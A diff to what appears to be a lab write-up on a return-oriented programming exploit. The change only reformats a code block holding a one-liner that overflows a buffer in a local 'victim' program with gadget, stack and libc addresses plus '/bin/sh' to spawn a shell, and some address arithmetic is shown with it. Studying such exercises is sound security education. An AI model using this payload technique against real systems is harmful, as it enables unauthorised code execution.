@@ -83,6 +83,9 @@ gadgets:	0x7ffff7a15000 + 0x22b9a = 0x7ffff7a37b9a
 bash: 		0x7fffffffe5a0 + 64d + 8d + 24d = 0x7fffffffe600 
 ```
 The code we used to use the ROP exploit was therefore:
-```(((printf %0144d 0; printf %016x 0x7ffff7a37b9a | tac -rs..; printf %016x 0x7fffffffe600 | tac -rs..; printf %016x 0x7ffff7a5b590 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim```
+
+```
+(((printf %0144d 0; printf %016x 0x7ffff7a37b9a | tac -rs..; printf %016x 0x7fffffffe600 | tac -rs..; printf %016x 0x7ffff7a5b590 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim
+```
 
 Which loads the right addresses onto the stack! This allows the program to return to the gadget instead of the OS, which executes our program!
